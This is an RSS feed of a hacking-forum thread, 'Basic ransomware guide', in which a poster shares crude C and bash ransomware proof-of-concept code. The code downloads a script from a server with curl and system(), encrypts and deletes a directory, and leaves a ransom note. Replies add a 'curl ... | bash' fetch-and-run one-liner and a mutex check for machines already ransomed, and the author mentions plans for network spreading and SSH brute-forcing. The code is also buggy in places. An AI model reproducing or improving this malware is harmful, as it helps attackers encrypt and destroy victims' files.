<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Basic ransomware guide</title>
    <link>https://0x00sec.org/t/basic-ransomware-guide/28345</link>
    <description>Hey everyone. I think this is my first official thread although I&#39;ve been a member for a while now. I&#39;ve been doing some programming in C lately and wanted to write a ransomware POC. However this version is very basic. The next one will be able to spread throughout a network, and also use a dictionary attack or brutforce ssh logins. All of this is for educational purposes, don&#39;t do anything dumb. More experienced malware coders please take a look and critique the code, I&#39;d appreciate it.


The first part of the malware includes a few essential libraries.  Next it checks to see if the OS is macOS, linux or windows. If it&#39;s windows the program should fail immediately. (The next version of this program will work on windows.

```#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/stat.h&gt;


 /*checks OS, fails if windows*/
void os_check(){
    #ifdef  _WIN32
        exit(1)
    
    #elif __APPLE__
            printf();
    
    #elif __LINUX__
        printf();
#endif

}
```

This next section checks to see if the host has already been infected. If so it fails automatically. Of course this to make sure the program doesn&#39;t try infect a system it&#39;s already compromised. Next, we create a pointer called *command. Then memory is allocated for it. Afterwards we pass a string to strcpy, which passes this to command. The command is then run by the system call, system(). If there&#39;s a better way to do this please let me know.  The commands are to download a shell script which encrypts the user&#39;s file or directory using aes256. 

There&#39;s several other features I wanted to add however I need to read up on implementing them. 

```/*uses stat to check for existence of worm*/

int infected(const char *filename){
    filename = &quot;/tmp/worm.c&quot;;
    struct stat buffer;
    int exist = stat(filename,&amp;buffer);
    if(exist == 0)
        exit(1);
    else
        return 0;

}

int main(void){
    
    char *command = malloc(60 * sizeof(char));

    strcpy(command, &quot;cd /tmp &amp;&amp; curl http://0.0.0.0:8000/encrypt.sh&quot;);
    system(command);
    strcpy(command, &quot;./encrypt.sh&quot;);
}
```
Shell script
```#!/bin/bash

#compresses file using tar, encrypts with openssl using aes256 encryption
if [ $1!=$1 ]
then
    cd /tmp/test #use whatever directory
    tar -czvf test.tar.gz test
    openssl aes256 -salt -in test.tar.gz -out test.aes256 -d -pass pass:#password
    rm test.tar.gz
    rm -r test
    echo &quot;All your files are encrypted!&quot; &gt; note.txt
fi 
```</description>
    
    <lastBuildDate>Sun, 29 May 2022 23:31:06 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/basic-ransomware-guide/28345.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Basic ransomware guide</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/basic-ransomware-guide/28345/19">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/basic-ransomware-guide/28345/19</link>
        <pubDate>Tue, 14 Jun 2022 21:17:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-28345-19</guid>
        <source url="https://0x00sec.org/t/basic-ransomware-guide/28345.rss">Basic ransomware guide</source>
      </item>
      <item>
        <title>Basic ransomware guide</title>
        <dc:creator><![CDATA[sashimi]]></dc:creator>
        <description><![CDATA[
            <p>A simpler way to avoid touch on disk and allocation just do:</p>
<p><code>system("curl http://0.0.0.0:8000/encrypt.sh | bash");</code></p>
          <p><a href="https://0x00sec.org/t/basic-ransomware-guide/28345/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/basic-ransomware-guide/28345/18</link>
        <pubDate>Sun, 29 May 2022 23:31:06 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-28345-18</guid>
        <source url="https://0x00sec.org/t/basic-ransomware-guide/28345.rss">Basic ransomware guide</source>
      </item>
      <item>
        <title>Basic ransomware guide</title>
        <dc:creator><![CDATA[niamul21]]></dc:creator>
        <description><![CDATA[
            <p>I feel so confident about this code by the way!</p>
          <p><a href="https://0x00sec.org/t/basic-ransomware-guide/28345/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/basic-ransomware-guide/28345/16</link>
        <pubDate>Fri, 13 May 2022 10:03:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-28345-16</guid>
        <source url="https://0x00sec.org/t/basic-ransomware-guide/28345.rss">Basic ransomware guide</source>
      </item>
      <item>
        <title>Basic ransomware guide</title>
        <dc:creator><![CDATA[c0z]]></dc:creator>
        <description><![CDATA[
            <p>Can you not scroll up?</p>
          <p><a href="https://0x00sec.org/t/basic-ransomware-guide/28345/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/basic-ransomware-guide/28345/14</link>
        <pubDate>Thu, 07 Apr 2022 05:36:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-28345-14</guid>
        <source url="https://0x00sec.org/t/basic-ransomware-guide/28345.rss">Basic ransomware guide</source>
      </item>
      <item>
        <title>Basic ransomware guide</title>
        <dc:creator><![CDATA[landi58]]></dc:creator>
        <description><![CDATA[
            <p>is there any other way to check already infected machine?</p>
          <p><a href="https://0x00sec.org/t/basic-ransomware-guide/28345/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/basic-ransomware-guide/28345/13</link>
        <pubDate>Wed, 06 Apr 2022 16:59:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-28345-13</guid>
        <source url="https://0x00sec.org/t/basic-ransomware-guide/28345.rss">Basic ransomware guide</source>
      </item>
      <item>
        <title>Basic ransomware guide</title>
        <dc:creator><![CDATA[c0z]]></dc:creator>
        <description><![CDATA[
            <p>It seems that itâ€™s just <code>__linux__</code><br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/b/2b8d8488555240cac593daecf734d3d9709deb1d.png" data-download-href="/uploads/short-url/6dhJlWosV8ZnpLSDJB5x9esMKBL.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/2/b/2b8d8488555240cac593daecf734d3d9709deb1d_2_690x293.png" alt="image" data-base62-sha1="6dhJlWosV8ZnpLSDJB5x9esMKBL" width="690" height="293" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/2/b/2b8d8488555240cac593daecf734d3d9709deb1d_2_690x293.png, https://0x00sec.s3.amazonaws.com/optimized/3X/2/b/2b8d8488555240cac593daecf734d3d9709deb1d_2_1035x439.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/2/b/2b8d8488555240cac593daecf734d3d9709deb1d_2_1380x586.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/2/b/2b8d8488555240cac593daecf734d3d9709deb1d_2_10x10.png"></a></div><p></p>
          <p><a href="https://0x00sec.org/t/basic-ransomware-guide/28345/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/basic-ransomware-guide/28345/12</link>
        <pubDate>Wed, 06 Apr 2022 04:42:12 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-28345-12</guid>
        <source url="https://0x00sec.org/t/basic-ransomware-guide/28345.rss">Basic ransomware guide</source>
      </item>
      <item>
        <title>Basic ransomware guide</title>
        <dc:creator><![CDATA[lexonight]]></dc:creator>
        <description><![CDATA[
            <p>on clang on my comp <code>__linux__</code> works <code>__LINUX__</code> does not</p>
          <p><a href="https://0x00sec.org/t/basic-ransomware-guide/28345/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/basic-ransomware-guide/28345/11</link>
        <pubDate>Tue, 05 Apr 2022 20:55:41 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-28345-11</guid>
        <source url="https://0x00sec.org/t/basic-ransomware-guide/28345.rss">Basic ransomware guide</source>
      </item>
      <item>
        <title>Basic ransomware guide</title>
        <dc:creator><![CDATA[snoop]]></dc:creator>
        <description><![CDATA[
            <p>bots bots bots are everywhere ignore them.</p>
          <p><a href="https://0x00sec.org/t/basic-ransomware-guide/28345/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/basic-ransomware-guide/28345/10</link>
        <pubDate>Sat, 12 Mar 2022 09:07:29 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-28345-10</guid>
        <source url="https://0x00sec.org/t/basic-ransomware-guide/28345.rss">Basic ransomware guide</source>
      </item>
      <item>
        <title>Basic ransomware guide</title>
        <dc:creator><![CDATA[Mr_RaG3R]]></dc:creator>
        <description><![CDATA[
            <p>How is this even relevant to this posting?</p>
          <p><a href="https://0x00sec.org/t/basic-ransomware-guide/28345/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/basic-ransomware-guide/28345/9</link>
        <pubDate>Tue, 22 Feb 2022 21:59:12 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-28345-9</guid>
        <source url="https://0x00sec.org/t/basic-ransomware-guide/28345.rss">Basic ransomware guide</source>
      </item>
      <item>
        <title>Basic ransomware guide</title>
        <dc:creator><![CDATA[Mr_RaG3R]]></dc:creator>
        <description><![CDATA[
            <p>Yea this will be useful, thanks. Never even thought about this.</p>
          <p><a href="https://0x00sec.org/t/basic-ransomware-guide/28345/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/basic-ransomware-guide/28345/5</link>
        <pubDate>Mon, 14 Feb 2022 06:07:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-28345-5</guid>
        <source url="https://0x00sec.org/t/basic-ransomware-guide/28345.rss">Basic ransomware guide</source>
      </item>
      <item>
        <title>Basic ransomware guide</title>
        <dc:creator><![CDATA[c0z]]></dc:creator>
        <description><![CDATA[
            <p>Also using name pipes or a mutex for checking the currently ransomed machines is usually how know if the process has either completed or hasnâ€™t even started.</p>
<pre><code class="lang-cpp">...
Handle h
#define SUS "Global\\NotSus"
#define TRUE 1
#define FALSE 0

static int exists() {
    int ret = FALSE;
    if ((h = CreateMutex(NULL, FALSE, SUS))) {
        DWORD error = GetLastError();
        if (error == ERROR_ALREADY_EXISTS) {
            CloseHandle(h);
            ret = TRUE;
        }
        if (error == ERROR_INVALID_HANDLE) {
            CloseHandle(h);
            fprintf(stderr, "ERROR: %s\n", "Invald handle");
            ret = FALSE;
        }
    }
    else {
        fprintf(stderr, "ERROR: Failed with 0x%x\n", GetLastError());
        return -1;
    }
    return ret;
}
</code></pre>
          <p><a href="https://0x00sec.org/t/basic-ransomware-guide/28345/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/basic-ransomware-guide/28345/4</link>
        <pubDate>Mon, 14 Feb 2022 04:32:05 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-28345-4</guid>
        <source url="https://0x00sec.org/t/basic-ransomware-guide/28345.rss">Basic ransomware guide</source>
      </item>
      <item>
        <title>Basic ransomware guide</title>
        <dc:creator><![CDATA[Mr_RaG3R]]></dc:creator>
        <description><![CDATA[
            <p>Thank you, Iâ€™ll take a look at your post, and itâ€™s good advertising <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/basic-ransomware-guide/28345/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/basic-ransomware-guide/28345/3</link>
        <pubDate>Sun, 13 Feb 2022 21:18:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-28345-3</guid>
        <source url="https://0x00sec.org/t/basic-ransomware-guide/28345.rss">Basic ransomware guide</source>
      </item>
      <item>
        <title>Basic ransomware guide</title>
        <dc:creator><![CDATA[crimsonRain]]></dc:creator>
        <description><![CDATA[
            <p>Itâ€™s good that code is straight to the point, but the preprocessor macros only work in compile time. Shameless advertising but maybe using this <a href="https://0x00sec.org/t/multi-platform-execution/25663">trick</a> could allow your program to run in Windows and Linux.</p>
          <p><a href="https://0x00sec.org/t/basic-ransomware-guide/28345/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/basic-ransomware-guide/28345/2</link>
        <pubDate>Sun, 13 Feb 2022 20:17:20 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-28345-2</guid>
        <source url="https://0x00sec.org/t/basic-ransomware-guide/28345.rss">Basic ransomware guide</source>
      </item>
      <item>
        <title>Basic ransomware guide</title>
        <dc:creator><![CDATA[Mr_RaG3R]]></dc:creator>
        <description><![CDATA[
            <p>Hey everyone. I think this is my first official thread although Iâ€™ve been a member for a while now. Iâ€™ve been doing some programming in C lately and wanted to write a ransomware POC. However this version is very basic. The next one will be able to spread throughout a network, and also use a dictionary attack or brutforce ssh logins. All of this is for educational purposes, donâ€™t do anything dumb. More experienced malware coders please take a look and critique the code, Iâ€™d appreciate it.</p>
<p>The first part of the malware includes a few essential libraries.  Next it checks to see if the OS is macOS, linux or windows. If itâ€™s windows the program should fail immediately. (The next version of this program will work on windows.</p>
<pre><code class="lang-auto">#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/stat.h&gt;


 /*checks OS, fails if windows*/
void os_check(){
    #ifdef  _WIN32
        exit(1)
    
    #elif __APPLE__
            printf();
    
    #elif __LINUX__
        printf();
#endif

}
</code></pre>
<p>This next section checks to see if the host has already been infected. If so it fails automatically. Of course this to make sure the program doesnâ€™t try infect a system itâ€™s already compromised. Next, we create a pointer called *command. Then memory is allocated for it. Afterwards we pass a string to strcpy, which passes this to command. The command is then run by the system call, system(). If thereâ€™s a better way to do this please let me know.  The commands are to download a shell script which encrypts the userâ€™s file or directory using aes256.</p>
<p>Thereâ€™s several other features I wanted to add however I need to read up on implementing them.</p>
<pre><code class="lang-auto">
int infected(const char *filename){
    filename = "/tmp/worm.c";
    struct stat buffer;
    int exist = stat(filename,&amp;buffer);
    if(exist == 0)
        exit(1);
    else
        return 0;

}

int main(void){
    
    char *command = malloc(60 * sizeof(char));

    strcpy(command, "cd /tmp &amp;&amp; curl http://0.0.0.0:8000/encrypt.sh");
    system(command);
    strcpy(command, "./encrypt.sh");
}
</code></pre>
<p>Shell script</p>
<pre><code class="lang-auto">
#compresses file using tar, encrypts with openssl using aes256 encryption
if [ $1!=$1 ]
then
    cd /tmp/test #use whatever directory
    tar -czvf test.tar.gz test
    openssl aes256 -salt -in test.tar.gz -out test.aes256 -d -pass pass:#password
    rm test.tar.gz
    rm -r test
    echo "All your files are encrypted!" &gt; note.txt
fi 
</code></pre>
          <p><a href="https://0x00sec.org/t/basic-ransomware-guide/28345/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/basic-ransomware-guide/28345/1</link>
        <pubDate>Sun, 13 Feb 2022 05:17:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-28345-1</guid>
        <source url="https://0x00sec.org/t/basic-ransomware-guide/28345.rss">Basic ransomware guide</source>
      </item>
  </channel>
</rss>
